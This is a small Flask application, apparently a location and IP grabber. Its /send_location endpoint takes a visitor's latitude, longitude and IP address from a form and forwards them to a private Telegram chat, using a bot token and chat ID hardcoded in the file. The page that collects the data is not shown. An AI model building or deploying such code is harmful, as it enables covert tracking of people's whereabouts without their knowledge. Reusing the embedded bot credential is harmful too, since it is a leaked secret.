from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')
    ip_address = request.form.get('ip_address')

    if latitude and longitude:
        # Location is available, send both location and IP address to Telegram
        message = f"Location: Latitude - {latitude}, Longitude - {longitude}\nIP Address: {ip_address}"
    else:
        # Location is not available, send only the IP address to Telegram
        message = f"IP Address: {ip_address}"

    # Send the message to Telegram using the Telegram Bot API
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    chat_id = '373715044'
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"

    response = requests.get(api_url)
    if response.status_code == 200:
        return 'Location and/or IP sent successfullyy!'
    else:
        return 'Failed to send location and/or IP.'

if __name__ == '__main__':
    app.run()
